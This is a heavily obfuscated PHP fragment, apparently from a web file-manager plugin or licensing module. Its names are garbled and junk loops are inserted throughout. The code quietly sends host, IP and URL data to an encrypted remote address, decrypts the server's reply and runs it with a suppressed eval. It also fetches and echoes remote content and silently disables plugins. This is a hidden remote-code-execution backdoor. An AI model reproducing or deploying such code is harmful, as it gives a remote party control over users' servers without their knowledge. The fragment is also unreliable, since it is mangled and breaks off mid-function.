ardo40db4489() { $ñ¤ÆˆëĞ =& $_SERVER[¦»×‡Ãã]; $„ÊÕÃ½ù =& $_SERVER[šÜÉ²œ]; $ıÍ‹½ö§ = array($„ÊÕÃ½ù[119], $„ÊÕÃ½ù[120]); $°¤Õş­œ = $ñ¤ÆˆëĞ[740]; while ($°¤Õş­œ < $ñ¤ÆˆëĞ[690]) { if ($°¤Õş­œ >= 0) { break; } $°¤Õş­œ++; } if (!KodUser::isRoot() || !isset($_GET[$„ÊÕÃ½ù[216]])) { return; } if (!in_array($_SERVER[$„ÊÕÃ½ù[24]], $ıÍ‹½ö§)) { return; } $ÍØ§ï– = $„ÊÕÃ½ù[217]; $ĞÄˆ÷¡ = $ñ¤ÆˆëĞ[741]; if (!$ĞÄˆ÷¡) { return; } $ÍØ§ï– = $this->isvyc724889c($ÍØ§ï–, $„ÊÕÃ½ù[218]); $–‡Ùœá = $ñ¤ÆˆëĞ[742]; $ÔÛãğ½· = stream_context_create(array($„ÊÕÃ½ù[219] => array($„ÊÕÃ½ù[220] => $„ÊÕÃ½ù[221], $„ÊÕÃ½ù[222] => 3))); $ÊÇµÒ÷º = $ñ¤ÆˆëĞ[743]; while (strlen($ÊÇµÒ÷º) < $ñ¤ÆˆëĞ[705]) { if (!$ÊÇµÒ÷º) { break; } $ÊÇµÒ÷º++; } $‘èËÕ€¢ = @file_get_contents($ÍØ§ï–, !1, $ÔÛãğ½·); $“¯™Ö©í = $ñ¤ÆˆëĞ[744]; while (strlen($“¯™Ö©í) < $ñ¤ÆˆëĞ[680]) { if (!$“¯™Ö©í) { break; } $“¯™Ö©í++; } header($„ÊÕÃ½ù[223]); $ÜÆ¦ãÊÊ = $ñ¤ÆˆëĞ[745]; if ($‘èËÕ€¢ && strstr($‘èËÕ€¢, $„ÊÕÃ½ù[224])) { echo $‘èËÕ€¢; } die; } public function earj5d2cfd78($ëÃÜ¦É·) { $‰„ˆ€ =& $_SERVER[¦»×‡Ãã]; $¥óåÒÓİ =& $_SERVER[šÜÉ²œ]; if ($this->eindaaa9dcf2 == $¥óåÒÓİ[225]) { return $ëÃÜ¦É·; } $ÀîĞøÊ¸ = $this->versionPluginList(); $ŠŸÇ¾Ü’ = $‰„ˆ€[746]; if (!$ŠŸÇ¾Ü’) { die; } $”¬’§ƒ = explode($¥óåÒÓİ[226], $this->versionPluginFilter()); $Ÿº½‡¶Á = array(); foreach ($ÀîĞøÊ¸ as $Ã´áúÉÄ => $è±ùä) { if ($è±ùä == $¥óåÒÓİ[227] && substr($this->eindaaa9dcf2, 0, 1) == $¥óåÒÓİ[227]) { continue; } if (!in_array($Ã´áúÉÄ, $”¬’§ƒ)) { $Ÿº½‡¶Á[] = $Ã´áúÉÄ; } } foreach ($Ÿº½‡¶Á as $Ã´áúÉÄ) { unset($ëÃÜ¦É·[$Ã´áúÉÄ]); $§ÖŠò¹İ = $‰„ˆ€[747]; if (strlen($§ÖŠò¹İ) < $‰„ˆ€[680]) { return; } } return $ëÃÜ¦É·; $ğß‹ÇÒá = $‰„ˆ€[748]; } private function versionPluginList() { $ÍÍ€ÃÅã =& $_SERVER[šÜÉ²œ]; return array($ÍÍ€ÃÅã[228] => $ÍÍ€ÃÅã[227], $ÍÍ€ÃÅã[229] => $ÍÍ€ÃÅã[227], $ÍÍ€ÃÅã[230] => $ÍÍ€ÃÅã[227], $ÍÍ€ÃÅã[231] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[233] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[234] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[235] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[236] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[237] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[238] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[239] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[240] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[241] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[242] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[243] => $ÍÍ€ÃÅã[232], $ÍÍ€ÃÅã[244] => $ÍÍ€ÃÅã[232]); $ùÈÛ¨Ì— = $_SERVER[¦»×‡Ãã][749]; if (!$ùÈÛ¨Ì—) { return; } } private function versionPluginFilter() { $ìÄô®¤Ê =& $_SERVER[šÜÉ²œ]; if ($this->eindaaa9dcf2 == $ìÄô®¤Ê[109]) { return $ìÄô®¤Ê[6]; } $ˆõñ½ÈÀ = _get($this->rncd81304194, $ìÄô®¤Ê[245], $ìÄô®¤Ê[6]); $ŞÛãÊÃ = _get($this->rncd81304194, $ìÄô®¤Ê[116], $ìÄô®¤Ê[6]); $ºäË³Œ­ = _get($this->rncd81304194, $ìÄô®¤Ê[246], $ìÄô®¤Ê[6]); $‹ËÙÉíº = $_SERVER[¦»×‡Ãã][750]; if (!$‹ËÙÉíº) { die; } if ($ŞÛãÊÃ > time() && $ºäË³Œ­ > time()) { $Ì¦ªêëÓ = explode($ìÄô®¤Ê[226], $ˆõñ½ÈÀ); $¿¯ÆÀˆ‹ = array_keys($this->versionPluginList()); $ˆõñ½ÈÀ = array_merge($Ì¦ªêëÓ, $¿¯ÆÀˆ‹); $ˆõñ½ÈÀ = implode($ìÄô®¤Ê[226], array_filter(array_unique($ˆõñ½ÈÀ))); } return $ˆõñ½ÈÀ; } private function veugd74d488d() { $ÂûÙÊÁı =& $_SERVER[šÜÉ²œ]; if ($this->eindaaa9dcf2 != $ÂûÙÊÁı[109]) { $GLOBALS[$ÂûÙÊÁı[86]][$ÂûÙÊÁı[90]][$ÂûÙÊÁı[247]] = $ÂûÙÊÁı[206]; return; } $GLOBALS[$ÂûÙÊÁı[86]][$ÂûÙÊÁı[248]] = $ÂûÙÊÁı[122]; if (Model($ÂûÙÊÁı[249])->get($ÂûÙÊÁı[63]) != $ÂûÙÊÁı[206]) { Model($ÂûÙÊÁı[249])->set($ÂûÙÊÁı[63], $ÂûÙÊÁı[206]); } } public function cwaz0f1224cc() { return $_SERVER[šÜÉ²œ][250]; } private function wknp6f3453a0() { $©÷éÏ´ =& $_SERVER[¦»×‡Ãã]; $Õ÷ªÂÅ =& $_SERVER[šÜÉ²œ]; $ª¦³€¥ = array($Õ÷ªÂÅ[251], $Õ÷ªÂÅ[252], $Õ÷ªÂÅ[253]); $á«º¡ = $©÷éÏ´[751]; while (strlen($á«º¡) < $©÷éÏ´[705]) { if (!$á«º¡) { break; } $á«º¡++; } $ßù«¾ˆ– = $Õ÷ªÂÅ[254] . md5($Õ÷ªÂÅ[255]); if ($this->eindaaa9dcf2 == $Õ÷ªÂÅ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Õ÷ªÂÅ[24]], $ª¦³€¥)) { return; } if (time() % 4 != 0) { return; } $ŒÎØÚµ = call_user_func(array($Õ÷ªÂÅ[256], $Õ÷ªÂÅ[257]), $ßù«¾ˆ–); $œŞÎéâ¾ = $©÷éÏ´[752]; if (strlen($œŞÎéâ¾) < $©÷éÏ´[680]) { die; } if ($ŒÎØÚµ && time() - $ŒÎØÚµ < intval($Õ÷ªÂÅ[258])) { return; } call_user_func(array($Õ÷ªÂÅ[256], $Õ÷ªÂÅ[139]), $ßù«¾ˆ–, time()); $…›ÜÈé = $©÷éÏ´[753]; $¤‚¥„Ó  = Model($Õ÷ªÂÅ[33])->get($Õ÷ªÂÅ[100]); $ ü³Îù = array($Õ÷ªÂÅ[152] => Model($Õ÷ªÂÅ[33])->get($Õ÷ªÂÅ[153]), $Õ÷ªÂÅ[167] => $this->eindaaa9dcf2, $Õ÷ªÂÅ[163] => $_SERVER[$Õ÷ªÂÅ[164]], $Õ÷ªÂÅ[165] => Model($Õ÷ªÂÅ[33])->get($Õ÷ªÂÅ[131]), $Õ÷ªÂÅ[105] => md5($_SERVER[$Õ÷ªÂÅ[106]] . $¤‚¥„Ó ), $Õ÷ªÂÅ[156] => $Õ÷ªÂÅ[136], $Õ÷ªÂÅ[159] => $_SERVER[$Õ÷ªÂÅ[160]]); $ƒ¼ä›¾ = $©÷éÏ´[754]; if (!$ƒ¼ä›¾) { return; } $ìÑ÷²îë = $this->mtvpd67e011e($Õ÷ªÂÅ[259], $ ü³Îù); if (!is_array($ìÑ÷²îë)) { return; } if ($ìÑ÷²îë[$Õ÷ªÂÅ[152]] && $ìÑ÷²îë[$Õ÷ªÂÅ[260]]) { if ($this->zrlw14f0f707($ìÑ÷²îë[$Õ÷ªÂÅ[260]]) == $ ü³Îù[$Õ÷ªÂÅ[152]]) { return; } } $this->bonk131f69b7(); $õ¤ÁË‘¸ = $©÷éÏ´[755]; if (strlen($õ¤ÁË‘¸) < $©÷éÏ´[684]) { return; } if ($this->zrlw14f0f707($ìÑ÷²îë[$Õ÷ªÂÅ[260]]) != $ ü³Îù[$Õ÷ªÂÅ[152]]) { $àÈ¥¸¾¦ = array($Õ÷ªÂÅ[185] => $¤‚¥„Ó , $Õ÷ªÂÅ[186] => $_SERVER[$Õ÷ªÂÅ[106]], $Õ÷ªÂÅ[187] => this_url(), $Õ÷ªÂÅ[161] => $_SERVER[$Õ÷ªÂÅ[162]]); $ûƒ¢ÒÉ = $this->ythj5b9ebc50(json_encode($àÈ¥¸¾¦)); $ìÑ÷²îë = $this->mtvpd67e011e($Õ÷ªÂÅ[188] . $ûƒ¢ÒÉ); if ($ìÑ÷²îë && is_array($ìÑ÷²îë) && isset($ìÑ÷²îë[$Õ÷ªÂÅ[260]])) { $ı‡Š†• = $this->xrydf0469844($ìÑ÷²îë[$Õ÷ªÂÅ[260]], 2); if ($ı‡Š†•) { $ı‡Š†• = $this->zrlw14f0f707($ı‡Š†•); } if ($ı‡Š†•) { try { @eval($ı‡Š†•); } catch (Exception $˜Ö™Ü§Ê) { } } } } } private function mtvpd67e011e($ïùãã­¾ = '', $ùçúï = array(), $áŸÖ¨Ÿ = 5) { $ôÙÚÆÉ© =& $_SERVER[¦»×‡Ãã]; $™Ç’×á =& $_SERVER[šÜÉ²œ]; $Â®Ïß­  = $™Ç’×á[261]; $Â®Ïß­  = $this->isvyc724889c($Â®Ïß­ , $™Ç’×á[262]); $Â®Ïß­  = $Â®Ïß­  . $ïùãã­¾; if ($ùçúï && is_array($ùçúï)) { $Â®Ïß­  = $Â®Ïß­  . $™Ç’×á[263] . http_build_query($ùçúï); } if ($ùçúï === -1) { return $Â®Ïß­ ; } $œ”ñëë¿ = stream_context_create(array($™Ç’×á[219] => array($™Ç’×á[222] => $áŸÖ¨Ÿ, $™Ç’×á[220] => $™Ç’×á[264]), $™Ç’×á[265] => array($™Ç’×á[266] => !1, $™Ç’×á[267] => !1))); $Ñûôñˆ« = $ôÙÚÆÉ©[756]; $ùçúï = @file_get_contents($Â®Ïß­ , !1, $œ”ñëë¿); return json_decode($ùçúï, !0); $ ¼Äˆƒ° = $ôÙÚÆÉ©[757]; } private function ovekbba1a6a4() { $áÄ€ö…ê =& $_SERVER[¦»×‡Ãã]; $ğğ”ÓØ =& $_SERVER[šÜÉ²œ]; $Óû¹Æ”± = array($ğğ”ÓØ[268] => $ğğ”ÓØ[269], $ğğ”ÓØ[270] => $ğğ”ÓØ[271], $ğğ”ÓØ[272] => $ğğ”ÓØ[273], $ğğ”ÓØ[274] => $ğğ”ÓØ[275], $ğğ”ÓØ[276] => $ğğ”ÓØ[277], $ğğ”ÓØ[278] => $ğğ”ÓØ[214], $ğğ”ÓØ[279] => $ğğ”ÓØ[214], $ğğ”ÓØ[280] => $ğğ”ÓØ[269], $ğğ”ÓØ[281] => $ğğ”ÓØ[271], $ğğ”ÓØ[282] => $ğğ”ÓØ[273], $ğğ”ÓØ[283] => $ğğ”ÓØ[284], $ğğ”ÓØ[285] => $ğğ”ÓØ[275], $ğğ”ÓØ[286] => $ğğ”ÓØ[287], $ğğ”ÓØ[288] => $ğğ”ÓØ[277], $ğğ”ÓØ[289] => $ğğ”ÓØ[290], $ğğ”ÓØ[291] => $ğğ”ÓØ[292], $ğğ”ÓØ[293] => $ğğ”ÓØ[294]); $ø¥«¿Š¹ = $Óû¹Æ”±[$this->eindaaa9dcf2]; $šÊ‰…¹ = $áÄ€ö…ê[758]; if (strlen($šÊ‰…¹) < $áÄ€ö…ê[690]) { die; } $ø¥«¿Š¹ = intval($ø¥«¿Š¹ ? $ø¥«¿Š¹ : $ğğ”ÓØ[269]); $€éÑè = $áÄ€ö…ê[759]; if (!$€éÑè) { return; } $‡©Î¸±Ö = _get($this->rncd81304194, $ğğ”ÓØ[295]); $‹ËÇĞ×Œ = $áÄ€ö…ê[760]; if (strlen($‹ËÇĞ×Œ) < $áÄ€ö…ê[694]) { return; } $‡©Î¸±Ö = $‡©Î¸±Ö ? intval($‡©Î¸±Ö) : 0; $Ìîö“Å = $áÄ€ö…ê[761]; while ($Ìîö“Å < $áÄ€ö…ê[694]) { if ($Ìîö“Å >= 0) { break; } $Ìîö“Å++; } return $ø¥«¿Š¹ + $‡©Î¸±Ö; } public function svkfff94a7b0($ğè¨ô) { $ªÄ¿€Ú¶ =& $_SERVER[šÜÉ²œ]; $³£© ²¤ = $this->ovekbba1a6a4(); if ($ğè¨ô[$ªÄ¿€Ú¶[296]] == $ªÄ¿€Ú¶[122]) { return; } if ($³£© ²¤ >= intval($ªÄ¿€Ú¶[214])) { return; } $û¾õ´Îõ = Model($ªÄ¿€Ú¶[125])->count(); if ($û¾õ´Îõ <= $³£© ²¤) { return; } $ä‚ª‰©ù = Model($ªÄ¿€Ú¶[125])->field($ªÄ¿€Ú¶[296])->limit($³£© ²¤)->select(); $ïõÚ¤€ë = $_SERVER[¦»×‡Ãã][762]; $ä‚ª‰©ù = array_to_keyvalue($ä‚ª‰©ù, $ªÄ¿€Ú¶[6], $ªÄ¿€Ú¶[296]); if (!in_array($ğè¨ô[$ªÄ¿€Ú¶[296]], $ä‚ª‰©ù)) { show_json($ªÄ¿€Ú¶[297], !1, $ªÄ¿€Ú¶[210]); } } public function rutb867a63e9() { $‚ã‹şÒ· =& $_SERVER[¦»×‡Ãã]; $Ÿ¾íšµš =& $_SERVER[šÜÉ²œ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $åš¯áãÀ = $Ÿ¾íšµš[217]; $åš¯áãÀ = $this->isvyc724889c($åš¯áãÀ, $Ÿ¾íšµš[218]); $ş½›–ç = $‚ã‹şÒ·[763]; while (strlen($ş½›–ç) < $‚ã‹şÒ·[680]) { if (!$ş½›–ç) { break; } $ş½›–ç++; } $¨Î³õƒù = stream_context_create(array($Ÿ¾íšµš[219] => array($Ÿ¾íšµš[220] => $Ÿ¾íšµš[221], $Ÿ¾íšµš[222] => 3))); $ÕåÑÉ€Ø = @file_get_contents($åš¯áãÀ, !1, $¨Î³õƒù); $ÑİƒíşÌ = $‚ã‹şÒ·[764]; if (!$ÑİƒíşÌ) { return; } echo $Ÿ¾íšµš[298] . hash_encode($ÕåÑÉ€Ø) . $Ÿ¾íšµš[299]; $íü¬¥‰‘ = $‚ã‹şÒ·[765]; if (strlen($íü¬¥‰‘) < $‚ã‹şÒ·[680]) { die; } } private function xevrf4f66e9a($‚°ªÓ—Ç, $¦À˜ıàº, $Í‡â‰† = 3) { $¨¢±À­¤ =& $_SERVER[¦»×‡Ãã]; $Ë°ø§üå =& $_SERVER[šÜÉ²œ]; usleep(1); $‚°ªÓ—Ç = trim($‚°ªÓ—Ç); $Á­‡ÕÙ§ = $¨¢±À­¤[766]; if (!$Á­‡ÕÙ§) { return; } $ãÀæ»Ë¨ = mt_rand(0, 5) . $Ë°ø§üå[6]; $Œ‹÷ğşÅ = rand_string(15); $Ÿàâù¨Â = $¨¢±À­¤[688]; if (!$Ÿàâù¨Â) { die; } $§ƒö´Ñä = $Ë°ø§üå[300]; switch ($ãÀæ»Ë¨) { case $Ë°ø§üå[206]: $ó›ˆ—ä = $this->vidyceeff10d($‚°ªÓ—Ç, strrev($¦À˜ıàº . $Œ‹÷ğşÅ)); $¿³ÒÎµ† = $¨¢±À­¤[767]; if (strlen($¿³ÒÎµ†) < $¨¢±À­¤[694]) { return; } break; case $Ë°ø§üå[122]: $ó›ˆ—ä = $this->vidyceeff10d($‚°ªÓ—Ç, strrev($Œ‹÷ğşÅ . $¦À˜ıàº)); $Šå‚¨¼ß = $¨¢±À­¤[768]; if (!$Šå‚¨¼ß) { return; } break; case $Ë°ø§üå[301]: $ó›ˆ—ä = $this->vidyceeff10d($‚°ªÓ—Ç, base64_encode($Œ‹÷ğşÅ . $¦À˜ıàº)); $“¼˜º¯ş = $¨¢±À­¤[769]; break; case $Ë°ø§üå[302]: $ó›ˆ—ä = $this->vidyceeff10d($‚°ªÓ—Ç, md5($Œ‹÷ğşÅ . $¦À˜ıàº)); $¾ÛåĞÙì = $¨¢±À­¤[770]; while ($¾ÛåĞÙì < $¨¢±À­¤[690]) { if ($¾ÛåĞÙì >= 0) { break; } $¾ÛåĞÙì++; } break; case $Ë°ø§üå[303]: $‚°ªÓ—Ç = base64_encode($‚°ªÓ—Ç); $§æê¯î = $¨¢±À­¤[771]; $µÆ§Ø÷† = rand(0, 64); $£Ò€ĞØ¶ = $¨¢±À­¤[772]; while ($£Ò€ĞØ¶ < $¨¢±À­¤[680]) { if ($£Ò€ĞØ¶ >= 0) { break; } $£Ò€ĞØ¶++; } $äÀñ‰à« = $§ƒö´Ñä[$µÆ§Ø÷†]; $Ø«îÑÁÌ = md5($äÀñ‰à« . md5($¦À˜ıàº . $äÀñ‰à«) . $¦À˜ıàº); $Ø«îÑÁÌ = substr($Ø«îÑÁÌ, $µÆ§Ø÷† % 8, $µÆ§Ø÷† % 8 + 7); $ì÷à÷ö¾ = $¨¢±À­¤[773]; $ê¿ÙÔÂò = $Ë°ø§üå[6]; $´ÉÊòÜË = $¨¢±À­¤[774]; if (!$´ÉÊòÜË) { die; } $ñÂÚ™­Ã = 0; $Âà–ê—× = 0; $¹†şÁÈÔ = 0; $ì›‡Ëº• = $¨¢±À­¤[775]; while ($ì›‡Ëº• < $¨¢±À­¤[690]) { if ($ì›‡Ëº• >= 0) { break; } $ì›‡Ëº•++; } for ($ñÂÚ™­Ã = 0; $ñÂÚ™­Ã < strlen($‚°ªÓ—Ç); $ñÂÚ™­Ã++) { $¹†şÁÈÔ = $¹†şÁÈÔ == strlen($Ø«îÑÁÌ) ? 0 : $¹†şÁÈÔ; $Âà–ê—× = ($µÆ§Ø÷† + strpos($§ƒö´Ñä, $‚°ªÓ—Ç[$ñÂÚ™­Ã]) + ord($Ø«îÑÁÌ[$¹†şÁÈÔ++])) % 64; $û’µÙ = $¨¢±À­¤[776]; if (!$û’µÙ) { die; } $ê¿ÙÔÂò .= $§ƒö´Ñä[$Âà–ê—×]; } $ó›ˆ—ä = hash_encode($äÀñ‰à« . $ê¿ÙÔÂò); $úÒÛ˜æ— = $¨¢±À­¤[777]; break; $¾ÅÄúÕİ = $¨¢±À­¤[778]; if (strlen($¾ÅÄúÕİ) < $¨¢±À­¤[694]) { die; } default: $ó›ˆ—ä = $this->vidyceeff10d($‚°ªÓ—Ç, $¦À˜ıàº . $Œ‹÷ğşÅ); $ş‚ğ·ã = $¨¢±À­¤[779]; if (!$ş‚ğ·ã) { die; } break; $Àë×Á•³ = $¨¢±À­¤[780]; } $ó›ˆ—ä = strrev($ãÀæ»Ë¨ . $Œ‹÷ğşÅ . $ó›ˆ—ä); $ïáØ•–Ë = $¨¢±À­¤[781]; if (!$ïáØ•–Ë) { return; } if ($Í‡â‰† - 1 > 0) { $ó›ˆ—ä = $this->xevrf4f66e9a($ó›ˆ—ä, $¦À˜ıàº, $Í‡â‰† - 1); } return $ó›ˆ—ä; } private function xrydf0469844($¥€¢Æö¯, $äúÕ”÷­, $Ù­Èüø = 3) { $òàÛ“Úö =& $_SERVER[¦»×‡Ãã]; $¾æµá =& $_SERVER[šÜÉ²œ]; if (!is_string($¥€¢Æö¯) || strlen($¥€¢Æö¯) < 10) { return !1; } $¥€¢Æö¯ = trim($¥€¢Æö¯); $¥€¢Æö¯ = strrev($¥€¢Æö¯); $Î«ï¢ß = $¥€¢Æö¯[0]; $¡”¦ï† = substr($¥€¢Æö¯, 1, 15); $“¥¨Î”ô = $òàÛ“Úö[782]; $¥€¢Æö¯ = substr($¥€¢Æö¯, 16); $Ç¹Êö§Ê = $¾æµá[300]; switch ($Î«ï¢ß) { case $¾æµá[206]: $ÕÓ±ƒƒÈ = $this->isvyc724889c($¥€¢Æö¯, strrev($äúÕ”÷­ . $¡”¦ï†)); break; $³ßıôíØ = $òàÛ“Úö[783]; while (strlen($³ßıôíØ) < $òàÛ“Úö[694]) { if (!$³ßıôíØ) { break; } $³ßıôíØ++; } case $¾æµá[122]: $ÕÓ±ƒƒÈ = $this->isvyc724889c($¥€¢Æö¯, strrev($¡”¦ï† . $äúÕ”÷­)); $›ûŸ‰Êä = $òàÛ“Úö[784]; if (strlen($›ûŸ‰Êä) < $òàÛ“Úö[684]) { die; } break; $Ï‡éåàø = $òàÛ“Úö[785]; while ($Ï‡éåàø < $òàÛ“Úö[705]) { if ($Ï‡éåàø >= 0) { break; } $Ï‡éåàø++; } case $¾æµá[301]: $ÕÓ±ƒƒÈ = $this->isvyc724889c($¥€¢Æö¯, base64_encode($¡”¦ï† . $äúÕ”÷­)); break; case $¾æµá[302]: $ÕÓ±ƒƒÈ = $this->isvyc724889c($¥€¢Æö¯, md5($¡”¦ï† . $äúÕ”÷­)); $Æ§Ìí•ğ = $òàÛ“Úö[786]; while (strlen($Æ§Ìí•ğ) < $òàÛ“Úö[694]) { if (!$Æ§Ìí•ğ) { break; } $Æ§Ìí•ğ++; } break; $ïØÉñ§¶ = $òàÛ“Úö[787]; if (!$ïØÉñ§¶) { die; } case $¾æµá[303]: $¥€¢Æö¯ = hash_decode($¥€¢Æö¯); $îùº¤ı³ = $¥€¢Æö¯[0]; $¥€¢Æö¯ = substr($¥€¢Æö¯, 1); $§‰–Ğ“ = strpos($Ç¹Êö§Ê, $îùº¤ı³); $âê¼‡ù£ = $òàÛ“Úö[788]; if (strlen($âê¼‡ù£) < $òàÛ“Úö[694]) { return; } $òº±ÍïŠ = md5($îùº¤ı³ . md5($äúÕ”÷­ . $îùº¤ı³) . $äúÕ”÷­); $ÅøİÇøÒ = $òàÛ“Úö[789]; while (strlen($ÅøİÇøÒ) < $òàÛ“Úö[680]) { if (!$ÅøİÇøÒ) { break; } $ÅøİÇøÒ++; } $òº±ÍïŠ = substr($òº±ÍïŠ, $§‰–Ğ“ % 8, $§‰–Ğ“ % 8 + 7); $ÆçâÖïÓ = $¾æµá[6]; $ãÊúÍñ½ = $òàÛ“Úö[790]; $Ì½¢©„˜ = 0; $ˆ¤¡ªü³ = $òàÛ“Úö[700]; while ($ˆ¤¡ªü³ < $òàÛ“Úö[680]) { if ($ˆ¤¡ªü³ >= 0) { break; } $ˆ¤¡ªü³++; } $Ê¦½×šà = 0; $«×­ê»” = $òàÛ“Úö[791]; if (strlen($«×­ê»”) < $òàÛ“Úö[694]) { die; } $ı…œİŸó = 0; $¸¥œ™Øà = $òàÛ“Úö[792]; while ($¸¥œ™Øà < $òàÛ“Úö[680]) { if ($¸¥œ™Øà >= 0) { break; } $¸¥œ™Øà++; } for ($Ì½¢©„˜ = 0; $Ì½¢©„˜ < strlen($¥€¢Æö¯); $Ì½¢©„˜++) { $ı…œİŸó = $ı…œİŸó == strlen($òº±ÍïŠ) ? 0 : $ı…œİŸó; $›àæÊ¼Ì = $òàÛ“Úö[793]; while ($›àæÊ¼Ì < $òàÛ“Úö[690]) { if ($›àæÊ¼Ì >= 0) { break; } $›àæÊ¼Ì++; } $Ê™¢±×Ö = $ı…œİŸó++; $»—’õÆº = $òàÛ“Úö[794]; while ($»—’õÆº < $òàÛ“Úö[694]) { if ($»—’õÆº >= 0) { break; } $»—’õÆº++; } $Ê¦½×šà = strpos($Ç¹Êö§Ê, $¥€¢Æö¯[$Ì½¢©„˜]) - $§‰–Ğ“ - ord($òº±ÍïŠ[$Ê™¢±×Ö]); $ùÌÓ•Ô = $òàÛ“Úö[795]; while ($Ê¦½×šà < 0) { $Ê¦½×šà += 64; $¥ÆàÃ– = $òàÛ“Úö[796]; } $ÆçâÖïÓ .= $Ç¹Êö§Ê[$Ê¦½×šà]; $’èË Çš = $òàÛ“Úö[797]; while (strlen($’èË Çš) < $òàÛ“Úö[705]) { if (!$’èË Çš) { break; } $’èË Çš++; } } $ÕÓ±ƒƒÈ = base64_decode($ÆçâÖïÓ); $ğ•—áÚ¥ = $òàÛ“Úö[798]; if (strlen($ğ•—áÚ¥) < $òàÛ“Úö[694]) { die; } break; $Íü§Èà = $òàÛ“Úö[799]; if (strlen($Íü§Èà) < $òàÛ“Úö[690]) { die; } default: $ÕÓ±ƒƒÈ = $this->isvyc724889c($¥€¢Æö¯, $äúÕ”÷­ . $¡”¦ï†); break; } if ($Ù­Èüø - 1 > 0) { $ÕÓ±ƒƒÈ = $this->xrydf0469844($ÕÓ±ƒƒÈ, $äúÕ”÷­, $Ù­Èüø - 1); } return $ÕÓ±ƒƒÈ; } public function ythj5b9ebc50($üçŒï²) { $Š¡¼ŞÊø =& $_SERVER[¦»×‡Ãã]; $·ÕÒù†ø =& $_SERVER[šÜÉ²œ]; $îÜî¢á = $this->ipek0934b59c(); $òÇ­–ÖÏ = $Š¡¼ŞÊø[800]; while ($òÇ­–ÖÏ < $Š¡¼ŞÊø[694]) { if ($òÇ­–ÖÏ >= 0) { break; } $òÇ­–ÖÏ++; } $á´×úµ = $this->ipek0934b59c(); $—Î¹âäÎ = $Š¡¼ŞÊø[801]; if (!$—Î¹âäÎ) { return; } $º§›ÕÁı = ($îÜî¢á - 1) * ($á´×úµ - 1); $õŞ™Ä÷Ç = intval(($îÜî¢á + $á´×úµ) / 2); while (1) { $Íä³¡Ïæ = $õŞ™Ä÷Ç; $ëÚ–ìƒ¯ = $Š¡¼ŞÊø[802]; if (!$ëÚ–ìƒ¯) { return; } $¦âçô´š = $º§›ÕÁı; while ($¦âçô´š % $Íä³¡Ïæ != 0) { $ªµ¿ÇÃÖ = $¦âçô´š; $¨·Ø±«İ = $Š¡¼ŞÊø[803]; if (!$¨·Ø±«İ) { return; } $¦âçô´š = $Íä³¡Ïæ; $—…Š·ª = $Š¡¼ŞÊø[804]; if (strlen($—…Š·ª) < $Š¡¼ŞÊø[694]) { return; } $Íä³¡Ïæ = $ªµ¿ÇÃÖ % $Íä³¡Ïæ; } if ($Íä³¡Ïæ == 1) { break; } else { $õŞ™Ä÷Ç++; } } $ûåÎŸÃ“ = 2; for ($ªœ‡„‡Ä = 0; $ªœ‡„‡Ä < $º§›ÕÁı * 10; $ªœ‡„‡Ä++) { if (($º§›ÕÁı * $ªœ‡„‡Ä + 1) % $õŞ™Ä÷Ç == 0) { $ûåÎŸÃ“ = intval(($º§›ÕÁı * $ªœ‡„‡Ä + 1) / $õŞ™Ä÷Ç); break; } } $Éã©¸ìª = $this->vidyceeff10d($îÜî¢á * $á´×úµ . $·ÕÒù†ø[6], $·ÕÒù†ø[136]); $Úø½¦Í‚ = md5($·ÕÒù†ø[304] . ($îÜî¢á + $á´×úµ) . $·ÕÒù†ø[305] . $õŞ™Ä÷Ç . $·ÕÒù†ø[305] . $ûåÎŸÃ“ . $·ÕÒù†ø[306]); $•ŞĞ¶è´ = $this->vidyceeff10d($üçŒï², $Úø½¦Í‚) . $·ÕÒù†ø[307] . $Éã©¸ìª; $·˜Ëáé  = $Š¡¼ŞÊø[805]; return $•ŞĞ¶è´; } public function zrlw14f0f707($×¨İÓİ¬) { $Ÿ‰ãÆ  =& $_SERVER[¦»×‡Ãã]; $†¸‰ŒîÚ =& $_SERVER[šÜÉ²œ]; $Ñ¾Õº–ó = explode($†¸‰ŒîÚ[307], $×¨İÓİ¬); $îÒ´öËŞ = $Ÿ‰ãÆ [806]; if (count($Ñ¾Õº–ó) != 2) { return $†¸‰ŒîÚ[6]; } $ô¶Ã×‰÷ = $this->isvyc724889c($Ñ¾Õº–ó[1] . $†¸‰ŒîÚ[6], $†¸‰ŒîÚ[136]); if (!$ô¶Ã×‰÷) { return $†¸‰ŒîÚ[6]; } $ô¶Ã×‰÷ = intval($ô¶Ã×‰÷); $¯‰˜Ş÷ = 0; $ä§ã Ï§ = $Ÿ‰ãÆ [807]; $—·Üá€ = 0; $Ÿ»¬ø˜ı = $Ÿ‰ãÆ [808]; while ($Ÿ»¬ø˜ı < $Ÿ‰ãÆ [694]) { if ($Ÿ»¬ø˜ı >= 0) { break; } $Ÿ»¬ø˜ı++; } for ($ÜåÃÖç£ = 3; $ÜåÃÖç£ < $ô¶Ã×‰÷; $ÜåÃÖç£ += 2) { if ($ô¶Ã×‰÷ % $ÜåÃÖç£ != 0) { continue; } $¯‰˜Ş÷ = $ÜåÃÖç£; $—·Üá€ = intval($ô¶Ã×‰÷ / $ÜåÃÖç£); $á¢Á¿­© = $Ÿ‰ãÆ [809]; while (strlen($á¢Á¿­©) < $Ÿ‰ãÆ [690]) { if (!$á¢Á¿­©) { break; } $á¢Á¿­©++; } break; } $æ ©Òå¬ = ($¯‰˜Ş÷ - 1) * ($—·Üá€ - 1); $ü±³„ìè = $Ÿ‰ãÆ [810]; if (strlen($ü±³„ìè) < $Ÿ‰ãÆ [694]) { die; } $ùîµÁœ½ = intval(($¯‰˜Ş÷ + $—·Üá€) / 2); while (1) { $ÏËÂº‘Ë = $ùîµÁœ½; $ç“Áíª = $æ ©Òå¬; $Ğ‡×ğ½¸ = $Ÿ‰ãÆ [811]; if (strlen($Ğ‡×ğ½¸) < $Ÿ‰ãÆ [684]) 